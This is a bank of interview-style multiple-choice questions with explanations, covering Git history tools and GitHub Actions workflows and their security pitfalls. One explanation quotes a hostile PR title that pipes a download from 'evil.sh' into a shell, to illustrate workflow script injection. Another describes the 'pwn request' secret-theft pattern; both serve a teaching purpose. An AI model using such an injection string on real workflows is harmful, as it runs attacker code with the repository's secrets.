questions.why: Listing the formatting commit SHAs lets `git blame --ignore-revs-file` (or `blame.ignoreRevsFile`, which GitHub also honours) attribute lines to the commit before the reformat. Without it, one mass reformat makes blame useless across the codebase.
questions.asked: A small sign of experience on a real codebase; it comes up when discussing adopting Prettier or dotnet format.

questions.q: You want the commit that removed the function `applyDiscount` from the codebase. Which command finds it?
choices: `git blame -- applyDiscount`
`git grep applyDiscount HEAD`
`git log --follow applyDiscount`
`git log -S applyDiscount`
questions.why: The pickaxe `-S` lists commits that changed how many times the string occurs, so it finds both the addition and the removal. `git grep` searches one snapshot, blame explains lines that still exist, and `--follow` tracks a file path, not a symbol.
questions.asked: Code archaeology comes up in debugging interviews; pickaxe is the answer that saves an afternoon.

questions.q: You want to bisect automatically using a test script. What must the script's exit code signal?
choices: 0 for good, 125 to skip, and other codes below 128 for bad
0 for bad, 1 for good, and any other value to stop bisecting
Any output on stderr means bad; silence means good
0 for good and 1 for bad; the exit code cannot express 'skip'
questions.why: `git bisect run` treats 0 as good, 1 to 127 except 125 as bad, and 125 as 'cannot test this one', for example a commit that does not build. Values above 127 abort the bisect. A script that reproduces the bug turns a manual hunt into a few minutes of unattended work.
questions.asked: Follows 'what is bisect'; knowing `bisect run` and skip shows you have actually used it on a regression.

questions.q: You need to review a colleague's branch while your own branch has half-finished work. What avoids stashing and switching?
choices: `git clone` the repository again into a second folder
`git worktree add ../review their-branch`
`git checkout --detach their-branch`
`git sparse-checkout set their-branch`
questions.why: A worktree is a second working directory attached to the same repository and object database, so you can have both branches checked out at once without a second clone or a second fetch. Detaching still replaces your working tree, and sparse-checkout limits which paths are present.
questions.asked: A practical workflow question; worktrees are also how people run a long test suite on one branch while coding on another.

questions.q: In a GitHub Actions job, `git describe --tags` fails with 'No names found'. The repository does have tags. Why?
choices: Tags are stored separately and need a GitHub token scope to read
Tags are only visible on the default branch, not on PR branches
`git describe` needs an annotated tag and ignores all tags otherwise
The checkout is shallow, so the history and tags were not fetched
questions.why: `actions/checkout` fetches a single commit by default (`fetch-depth: 1`). With no history and no tags there is nothing to describe. Set `fetch-depth: 0`, or fetch tags explicitly, in jobs that compute versions or changelogs.
questions.asked: A real CI debugging moment; the answer shows you know CI clones differ from your local clone.

questions.q: You push `main` after creating tag `v2.1.0` locally. The tag is not on the remote. Why?
choices: Tags are pushed only when their commit is the newest on the branch
`git push` does not send tags unless told to, e.g. with `--follow-tags`
Tags are local-only and cannot be pushed; releases use GitHub instead
The tag needs a `v` prefix to be recognised as a release
questions.why: A normal push sends the branch refs you name, not tags. `git push origin v2.1.0` sends one tag; `--follow-tags` sends annotated tags reachable from the pushed commits, but not lightweight ones.
questions.asked: Everyday release mechanics; the strong answer knows the annotated-versus-lightweight difference.

questions.q: What is the practical difference between an annotated tag and a lightweight tag?
choices: Annotated tags are pushed automatically; lightweight tags are local
Annotated tags can point at any object; lightweight tags only at branches
Annotated tags are separate objects with tagger, date and message
Annotated tags are immutable; lightweight tags follow the branch
questions.why: A lightweight tag is just a ref to a commit. An annotated tag is a tag object with its own metadata (and optional signature) that the ref points to. `git describe` uses annotated tags by default, which is why release tags should be annotated. Neither kind moves on its own.
questions.asked: Release hygiene; ties into describe, signing and --follow-tags.

questions.q: Your team squash-merges PRs. You branched `part-2` off `part-1` before `part-1` was merged. Rebasing `part-2` on main now conflicts with its own changes. Why?
choices: Squash merges disable rebase detection until the branch is deleted
Main now has one squash commit with different SHAs from part-1's commits
`part-1`'s commits were deleted from the remote when it was merged
Git cannot rebase a branch whose parent branch no longer exists
questions.why: Squash merging creates a brand-new commit, so Git does not recognise part-1's original commits as already applied and tries to replay them again. `git rebase --onto main part-1 part-2` (or `--update-refs` stacks) replays only part-2's own commits.
questions.asked: Hits everyone who stacks PRs in a squash-merge team; the `--onto` fix is the strong answer.

questions.q: After squash-merging your PR, `git branch -d my-feature` says the branch is not fully merged. Is something wrong?
choices: No: the squash commit is new, so Git cannot see your commits in main
Yes: the squash merge silently dropped some of your changes
Yes: the remote branch must be deleted before the local one
No: `-d` always refuses branches that were pushed
questions.why: `-d` checks reachability, and your original commits are not ancestors of main after a squash merge even though their changes are. Once you have confirmed the PR merged, `-D` is safe. `git fetch --prune` tidies stale remote-tracking branches.
questions.asked: Everyday confusion that tests whether you understand reachability versus content.

questions.q: You need to undo a merge commit that is already on main. What does `git revert -m 1 <merge-sha>` do?
choices: Reverts only the first commit of the merged branch
Removes the merge commit from history and force-pushes main
Reverts the merge but keeps the branch's commits in history as if unmerged
Adds a commit undoing the merged changes, relative to parent 1
questions.why: A merge has two parents, so revert needs to know which side is mainline; `-m 1` means keep the first parent (main) and undo what the merge brought in. Later re-merging the same branch will not bring those commits back, because Git considers them merged: you revert the revert instead.
questions.asked: Asked of people who have handled a bad merge; the 'revert the revert' follow-up is what separates answers.

questions.q: Your repository has `* text=auto` in `.gitattributes`. What does it do?
choices: Makes Git treat every file as text, including images and binaries
Converts all files to the author's local line endings on commit
Stores detected text files with LF in the repository, whatever the OS
Forces UTF-8 encoding without a BOM on every text file when it is committed
questions.why: Git detects which files are text and normalises their line endings to LF in the object database, converting on checkout according to `eol` settings. Committing it in `.gitattributes` makes the rule apply to everyone, unlike per-machine `core.autocrlf`. It does not touch encoding.
questions.asked: Mixed Windows and macOS teams hit whole-file diffs from CRLF; this is the fix that sticks.

questions.q: In GitHub Actions, a workflow has a `build` job and a `test` job with no `needs`. How do they run?
choices: In parallel, on separate fresh runners that share no files
One after another in file order, on one shared runner
In parallel, on one runner, sharing a single checked-out workspace
In file order, stopping at the first job that fails
questions.why: Jobs are independent by default: each gets its own runner and a clean workspace. `needs: build` makes test wait for build, and anything build produced must be passed across with artifacts or a cache, because the filesystem is not shared.
questions.asked: The first thing people get wrong when splitting a pipeline into jobs; the follow-up is how to pass the build output along.

questions.q: Your `deploy` job needs the `dist/` folder produced by the `build` job. What is the standard way to hand it over?
choices: Write it to `/tmp`, which all jobs in a run share
Upload it as an artifact in build and download it in deploy
Commit `dist/` back to the branch in build and pull it in deploy
Use a job-level `outputs:` value to pass the folder's contents
questions.why: Artifacts (`actions/upload-artifact` and `download-artifact`) are the mechanism for files produced in one job and consumed by another in the same run. Job outputs carry small strings such as a version number. Each job has its own runner, so `/tmp` is not shared, and committing build output pollutes history.
questions.asked: Tests whether you know the difference between artifacts, caches and outputs, which people often mix up.

questions.q: What is the difference between a cache and an artifact in GitHub Actions?
choices: Caches are per job; artifacts are shared by every workflow in the repo
Caches store secrets safely; artifacts are public to anyone who can read the repo
Caches speed up later runs with reusable inputs; artifacts keep a run's outputs
Caches are kept forever; artifacts are deleted when the run finishes
questions.why: A cache, keyed by something like the lockfile hash, restores dependencies so future runs are faster, and a miss must be harmless. An artifact is a run's product, such as a build, report or coverage file, kept for a retention period. Caches are evicted when unused or over quota, not kept forever.
questions.asked: Distinguishes speed-ups from deliverables; the strong answer adds that a cache miss must never change the result.

questions.q: What does this step do, and why is it there?
questions.code:
- uses: actions/setup-node@v4
  with:
    node-version: 24
    cache: npm
choices: Caches `node_modules` itself so `npm ci` can be skipped entirely on later runs
Caches the Node binary so the runner does not download Node again
Caches the npm download cache, keyed on the lockfile, to speed up `npm ci`
Caches the build output so unchanged packages are not rebuilt
questions.why: `cache: npm` saves npm's global package cache keyed on a hash of `package-lock.json`; `npm ci` still runs and still deletes `node_modules`, but downloads come from the cache. Caching `node_modules` directly is fragile across Node versions and OSes.
questions.asked: Common in take-home CI setups; shows you know why `npm ci` still runs.

questions.q: A workflow step contains the line below. Why is it a security problem?
choices: PR titles count as secrets and appear unmasked in the job log
The expression is substituted into the script, so a crafted title runs as shell
`echo` sends the title to GitHub's audit log, which anyone can read
The expression is evaluated on the fork's runner, where it can read all of your secrets
questions.why: `${{ }}` is expanded into the script text before the shell runs, so a title such as `"; curl evil.sh | sh; "` becomes code. Pass untrusted values through `env:` and reference them as `"$TITLE"`, which the shell treats as data.
questions.asked: Script injection in workflows is a real, widely exploited bug class; interviewers for senior-leaning roles like hearing the env-var fix.

questions.q: Why do security guides recommend pinning third-party actions to a full commit SHA instead of `@v4`?
choices: A tag can be moved to malicious code; a commit SHA cannot be changed
SHAs make the workflow start faster, because GitHub skips version resolution
Tags only work for actions published by GitHub itself
`@v4` always resolves to the latest major, which may break your build
questions.why: Git tags are mutable, so a compromised maintainer account can repoint `v4` at code that steals your secrets, as happened with a popular action in 2025. A SHA names exact content. Dependabot or Renovate can keep pinned SHAs up to date with a version comment.
questions.asked: Supply-chain security is now a standard CI question; the strong answer mentions keeping pins updated automatically.

questions.q: What does this workflow-level block achieve?
choices: Only users with read access to the repository can trigger the workflow
The workflow can read secrets but cannot print them in logs
Jobs may read repository files but cannot use any secrets at all
The `GITHUB_TOKEN` can read the repo and do nothing else
questions.why: The `permissions` key scopes the automatic `GITHUB_TOKEN`; any scope not listed is set to none. Jobs that must comment on PRs or publish packages opt in per job. It has nothing to do with who may trigger the workflow or with your own secrets.
questions.asked: Least privilege applied to CI; interviewers want to hear that a compromised step can only do what the token allows.

questions.q: A PR from a fork runs your `pull_request` workflow, and the step that uses `secrets.NPM_TOKEN` gets an empty value. Why?
choices: Secrets must be re-entered on every fork before they can be used
The secret expired, because repository secrets rotate automatically after every pull request
Secrets are not given to fork PR runs, so untrusted code cannot steal them
Secrets only work in workflows triggered by `push` to the default branch
questions.why: For `pull_request` events from forks, GitHub withholds repository secrets and gives a read-only `GITHUB_TOKEN`, because the workflow runs code the fork author wrote. Design fork CI to need no secrets; `pull_request_target` has secrets precisely because it must never run the fork's code.
questions.asked: Relevant to anyone maintaining a public repository; leads straight into the pull_request_target trap.

questions.q: A workflow uses `on: pull_request_target`, checks out the PR's head commit and runs `npm install && npm test`. What is wrong?
choices: Nothing; `pull_request_target` sandboxes the PR code for this reason
It runs fork code with the base repository's secrets and write token
It tests the base branch, not the PR, so the results are meaningless
It fails, because `pull_request_target` cannot check out fork commits
questions.why: `pull_request_target` runs in the base repository's context with secrets and a write-capable token, intended for tasks like labelling. Installing and running the fork's code there hands an attacker those secrets: an install script is enough. Run untrusted code under plain `pull_request` instead.
questions.asked: Known as a 'pwn request'; knowing it signals real awareness of CI security.

questions.q: What does this block do on a busy PR?
choices: Runs every job of the workflow on the same runner to save minutes
Stops two different PRs from running CI at the same time
Retries a cancelled run automatically once the next push finishes
Cancels the older run for the same ref when a new push arrives
questions.why: Runs sharing a concurrency group are serialised, and `cancel-in-progress` cancels the running one when a newer one starts. Grouping by ref means only superseded runs for the same branch or PR are cancelled; other PRs are unaffected.
questions.asked: A cheap win that shows you think about CI cost and feedback speed.

questions.q: You must never cancel a production deploy halfway. How should concurrency be set for the deploy workflow?
choices: Omit `concurrency`, because deploys already run one at a time
One fixed group for deploys, with `cancel-in-progress: false`
A group per commit SHA with `cancel-in-progress: true`
A `timeout-minutes: 0` on the deploy job so it cannot be stopped
questions.why: A single group such as `deploy-production` queues deploys so two never overlap, and `cancel-in-progress: false` lets the running one finish while a newer one waits. Without a group, two merges in quick succession deploy concurrently and can finish in the wrong order.
questions.asked: Shows you have thought about what 'cancel' means for side-effecting jobs, not just tests.

questions.q: In a matrix of Node 20, 22 and 24, the Node 20 job fails. What happens to the others by default?
choices: They keep running, since matrix jobs are fully independent
They restart on Node 24 only, as the latest supported version
The in-progress ones are cancelled, because `fail-fast` defaults to true
They finish, and the workflow is marked successful as long as at least one job passed
questions.why: `strategy.fail-fast` defaults to true, cancelling the remaining matrix jobs when one fails, which saves minutes but hides whether the failure is version-specific. Set `fail-fast: false` when you need the whole picture.
questions.asked: Matrix builds are common for libraries; the default is a frequent surprise.

questions.q: You want a step that posts to Slack only when an earlier step in the job failed. Which condition do you use?
choices: `if: failure()`
`if: always()`
`if: cancelled()`
`if: !success()`
questions.why: Steps run only when everything before succeeded unless the `if` uses a status function. `failure()` is true when a previous step failed. `always()` would post on success too, `cancelled()` only on cancellation, and `!success()` would also fire on cancellation (and needs quoting in YAML because of the leading `!`).
questions.asked: Simple, but people often reach for always() and then spam the channel.

questions.q: A step runs `export APP_VERSION=1.2.3`. The next step prints an empty `$APP_VERSION`. Why?
choices: Environment variables need the `env:` prefix in their name before they persist between steps
Variables are only visible inside the job's `container:` block
The runner strips variables whose names contain `VERSION`
Each step is a new shell; write the value to `$GITHUB_ENV` to share it
questions.why: Every `run` step starts a fresh process, so exported variables die with it. Appending `APP_VERSION=1.2.3` to the file at `$GITHUB_ENV` makes it available to later steps in the same job; `$GITHUB_OUTPUT` is for named step outputs.
questions.asked: Everyone hits it once; shows you understand how steps execute.

questions.q: Your nightly workflow uses `schedule: cron: '0 2 * * *'`. When does it run?
choices: 02:00 UTC, on the latest commit of the default branch
02:00 in the repository owner's local time zone
02:00 UTC, on whichever branch last changed the workflow file
Exactly at 02:00 UTC, guaranteed to the second
questions.why: Scheduled workflows use UTC and run the workflow file from the default branch. They can start late when runners are busy, and GitHub disables schedules in public repositories after 60 days without activity, so they are not a precise or guaranteed timer.
questions.asked: Time zones and 'why did my nightly job not run' come up in real maintenance work.

questions.q: A job pushes a version-bump commit using the default `GITHUB_TOKEN`. Your `on: push` CI workflow does not run for it. Why?
choices: Commits made in Actions are marked as drafts until a human pushes
Events caused by `GITHUB_TOKEN` do not trigger new workflow runs
The push was rejected, because the token has no write permission
CI skips commits whose message starts with 'chore'
questions.why: To prevent infinite loops, events created with the repository's `GITHUB_TOKEN` do not start new runs (apart from `workflow_dispatch` and `repository_dispatch`). If you need the follow-on run, use a GitHub App token or trigger the next workflow explicitly.
questions.asked: Explains a confusing real behaviour; the strong answer names the loop-prevention reason.

questions.q: Your CI workflow has `paths: ['src/**']` and its check is required on main. A PR changing only the README cannot be merged. Why?
choices: Required checks always fail when no source files changed
The README must be listed in `paths` before it can be merged
The workflow never ran, so the required check stays pending forever
Path filters only apply to pushes, so the PR ran and failed silently
questions.why: A workflow skipped by a path filter reports no status, and branch protection waits for a required check that never arrives. Fixes include a job that always runs and reports success when nothing relevant changed, or doing the path check inside the job.
questions.asked: A real-world gotcha teams trip over after 'optimising' CI; it tests understanding of how required checks work.

questions.q: What is the difference between a reusable workflow and a composite action?
choices: A reusable workflow is YAML; a composite action must be written in JavaScript
A reusable workflow is called as a whole job; a composite action is used as a step
A reusable workflow only works within one repository; composite actions are shareable
A reusable workflow cannot take inputs; a composite action can
questions.why: A workflow with `on: workflow_call` is invoked with `uses:` at the job level and can contain several jobs with their own runners. A composite action bundles steps and is used inside a job's steps. Both are YAML, both take inputs and both can be shared across repositories.
questions.asked: Relevant to anyone who has had to deduplicate CI across many repos.

questions.q: Integration tests need Postgres in CI. What is the usual GitHub Actions approach?
choices: Install Postgres with `apt-get` inside every test step
Point the tests at the shared staging database with a CI user
Replace Postgres with SQLite in CI because it needs no server
Declare a `services: postgres` container with a health check
questions.why: Service containers start alongside the job, and a health-check option makes the job wait until the database accepts connections. Tests then run against the real engine you use in production. Sharing staging makes runs interfere with each other, and SQLite behaves differently on types, locking and SQL dialect.
questions.asked: Asked alongside 'how do you integration-test an API'; Testcontainers is an equally good answer.

questions.q: How do you make production deploys in GitHub Actions wait for a human approval?
choices: Add a `sleep` step and let someone cancel the run if needed
Give the deploy job an environment with a required-reviewers rule
Put the deploy in a separate repository that only admins can push to
Use `workflow_dispatch` and remove the automatic trigger
questions.why: Environments carry protection rules such as required reviewers and wait timers, plus their own secrets that are released only after approval. A manual trigger works but loses the link to the tested build and the audit trail of who approved.
questions.asked: Shows you know the platform feature rather than inventing a manual workaround.

questions.q: What does `permissions: id-token: write` enable in a deploy job?
choices: Signing any commits the workflow makes with the runner's own machine identity
Writing user identity data to the repository's secret store
Requesting an OIDC token to exchange for short-lived cloud credentials
Creating a new GitHub App identity for the duration of the job
questions.why: The job can ask GitHub for a signed OIDC token describing the repository, branch and environment; a cloud provider trusts that issuer and swaps it for temporary credentials. No long-lived key is stored in secrets. Without the permission the token cannot be requested.
questions.asked: Follows the 'why OIDC' question; knowing the permission name shows hands-on use.

questions.q: Your workflow uses `runs-on: ubuntu-latest`. One Monday, a build breaks without any code change. What is a likely cause?
choices: `ubuntu-latest` was re-pointed to a newer image with different tools
The runner rebooted in the middle of the build, which corrupts the checked-out files
GitHub rotated your repository secrets over the weekend, so the old values stopped working
Weekend runs use slower runners that time out
questions.why: `-latest` labels move to a new OS image over a rollout period, which changes preinstalled tool versions. Pin `ubuntu-24.04` and set tool versions explicitly with setup actions when reproducibility matters, then upgrade deliberately.
questions.asked: A reproducibility question; pairs with lockfiles and pinned Docker bases.

questions.q: How does a step publish a value such as `version` for later steps to read as `steps.meta.outputs.version`?
choices: `echo "::set-output name=version::1.2.3"` in the step
`export version=1.2.3` in a step with `id: meta`
`echo "version=1.2.3" >> "$GITHUB_OUTPUT"` in a step with `id: meta`
Setting `outputs: version: 1.2.3` under the step's own `with:` block of inputs
questions.why: Appending `name=value` to the file at `$GITHUB_OUTPUT` sets a step output, readable by later steps via the step's `id`. The `::set-output` command is deprecated and disabled for security reasons, and exported shell variables do not outlive the step.
questions.asked: Everyday workflow authoring; many tutorials still show the deprecated form.

questions.q: A job has hung for hours. What is the default `timeout-minutes` for a GitHub Actions job?
choices: 10 minutes
60 minutes
Unlimited
360 minutes
questions.why: Jobs on GitHub-hosted runners default to a 6-hour timeout, so a hung test can burn hours of minutes. Setting a realistic `timeout-minutes` on each job (and step, where useful) fails fast and cheaply.
questions.asked: Less about the number than the habit of setting explicit timeouts.

questions.q: Your team uses a merge queue on main. Why must CI also run on the `merge_group` event?
choices: The queue tests a temporary branch of main plus queued PRs, not the PR itself
Merge queues cannot use `pull_request` workflows for any required status checks at all
`merge_group` is the only event that has access to repository secrets
The queue needs a separate workflow to rebase each PR onto main
questions.why: A merge queue builds a temporary ref combining main with the PRs ahead of yours and requires the checks to pass on it before merging. If your workflow does not listen for `merge_group`, no check is reported and the queue stalls.
questions.asked: Increasingly common on busy repos; shows you understand why a PR green on its own can still break main.

questions.q: Why do teams enable 'Require branches to be up to date before merging' on main?
choices: It forces each PR to be squashed into a single commit
It blocks merges while any other PR has a failing check
It stops a PR merging until main has no open conflicts
CI must have passed against the current main, not an old base
questions.why: Two PRs can each pass against an old main yet break when combined. Requiring an up-to-date branch means the checks ran on the code that will actually land. On busy repositories a merge queue does the same without everyone rebasing repeatedly.
questions.asked: Explains how main breaks despite every PR being green, and leads to merge queues.

questions.q: Secrets are masked in GitHub Actions logs. Which action can still leak one into the log?
choices: Printing the secret's exact value with `echo`
Passing the secret to a step via `env:`
Printing a transformed form, such as its base64 encoding
Using the secret in a `curl` Authorization header, which curl echoes to stderr
questions.why: Masking replaces exact occurrences of registered secret values. A base64 or URL-encoded version is a different string, so it is printed in full. Printing the exact value is masked, and passing it through `env` or a header does not log it unless you echo the command with its arguments.
questions.asked: Tests whether you treat log masking as a safety net rather than a guarantee.

questions.q: You want CI to catch vulnerable dependencies. Which statement about `npm audit` is accurate?
choices: It scans your own code for injection bugs as well as dependencies
It checks installed versions against advisories and exits non-zero on findings
It upgrades vulnerable packages to patched versions automatically and rewrites the lockfile
It only checks direct dependencies listed in `package.json`
questions.why: `npm audit` compares the resolved tree, including transitive packages, with the advisory database and returns a non-zero exit code when issues at or above `--audit-level` exist. `npm audit fix` makes changes; plain audit does not. It knows nothing about your own code.
questions.asked: A basic supply-chain check; the strong answer mentions audit level and triaging dev-only findings.

questions.q: Which ordering of CI steps gives the fastest useful feedback on a typical Node PR?
choices: Build the Docker image, then run all tests inside it, then lint
End-to-end tests first, since they exercise the whole stack and catch the most bugs
Install, then lint and type-check, then unit tests, then slower suites
Unit tests, then deploy to staging, then type-check at the end
questions.why: Cheap checks that fail often (lint, `tsc --noEmit`) should run first or in parallel so a typo fails in one minute, not twenty. Slow end-to-end suites come last or in a parallel job. Type-checking after a staging deploy wastes the deploy.
questions.asked: Checks practical judgement about feedback loops rather than tooling trivia.

questions.q: What is Dependabot (or Renovate) for in a repository's CI setup?
choices: It opens PRs that bump dependency and action versions so CI can test them
It rewrites the lockfile at build time to use the newest versions
It blocks merges whenever any dependency in the lockfile is more than a year old
It scans your code for secrets before each push
questions.why: These bots propose version bumps as ordinary PRs, so upgrades go through the same tests and review as any change. Builds stay reproducible because nothing changes until a PR merges. Secret scanning is a separate feature.
questions.asked: Shows you keep dependencies current deliberately rather than letting them rot or float.

questions.q: A test fails in CI about one run in ten, never locally. What is the most useful first move?
choices: Add an automatic retry to the CI job so the pipeline turns green and nobody is blocked
Delete the test, because a flaky test is worse than no test
Increase the job's timeout so the test has more time to finish
Record it, quarantine it with an owner, and look for timing or order dependence
questions.why: Flaky tests usually hide real timing, shared-state or ordering bugs. Quarantining keeps main trustworthy while someone owns the fix; blanket retries teach everyone to ignore red builds, and deleting it throws away the signal.
questions.asked: Every team has flaky tests; interviewers want a process, not a shrug.

questions.q: What is a Git pre-commit hook (for example via Husky and lint-staged) good for, and what can it not do?
choices: It runs checks locally before a commit, but `--no-verify` skips it, so CI must repeat them
It runs on the Git server and rejects pushes containing lint errors from every contributor
It is installed by `git clone` automatically, so every developer gets it
It replaces CI for linting, since every commit has already been checked
questions.why: Client-side hooks give fast local feedback on staged files, but they live in each clone, must be installed by a tool such as Husky, and can be bypassed. They are a convenience; the pipeline is the enforcement point.
questions.asked: Distinguishes convenience from enforcement, which is the whole point of CI gates.

questions.q: Why do teams use a `CODEOWNERS` file together with branch protection?
choices: It gives the listed people exclusive push access to every file under the matching paths
It automatically requests, and can require, review from the owners of changed paths
It prevents anyone outside the file from opening pull requests
It sets who is paged when tests in those paths fail
questions.why: Matching paths add their owners as reviewers, and with 'require review from code owners' a PR cannot merge without their approval. It does not change who can push or open PRs, and it is not an alerting config.
questions.asked: Common in larger repos; shows awareness of review routing.

questions.q: What does the Conventional Commits format (`feat:`, `fix:`, `feat!:`) make possible?
choices: Git refuses commits that do not match the format
Commits can be merged without review when prefixed with `fix:`
The commit type decides which CI jobs run for that commit and which are skipped
Tools can derive the next semantic version and a changelog from history
questions.why: Because the type is machine-readable, release tools can map `fix` to a patch, `feat` to a minor and `!` or `BREAKING CHANGE` to a major, and group entries into a changelog. Git itself does not enforce it; a commit-msg hook or CI check does.
questions.asked: Links commit hygiene to release automation, which interviewers like to hear connected.

questions.q: `npm ci` fails in CI with a message that `package.json` and `package-lock.json` are out of sync. What happened?
choices: The CI cache holds an older `node_modules` that conflicts with the lockfile
The registry is down, so npm cannot verify the lockfile's integrity hashes
Someone changed `package.json` without committing the updated lockfile
`npm ci` needs `--force` whenever the lockfile is older than a week
questions.why: `npm ci` installs exactly what the lockfile says and refuses to proceed if it does not satisfy `package.json`, rather than silently re-resolving. Run `npm install` locally, commit the lockfile, and the build passes. It deletes `node_modules` first, so a cached folder is irrelevant.
questions.asked: A daily CI failure; the fix is trivial but the reason shows you know what npm ci guarantees.

questions.q: Your Node API container takes 10 seconds to stop on every deploy, then is killed. The Dockerfile ends with the line below. Why?
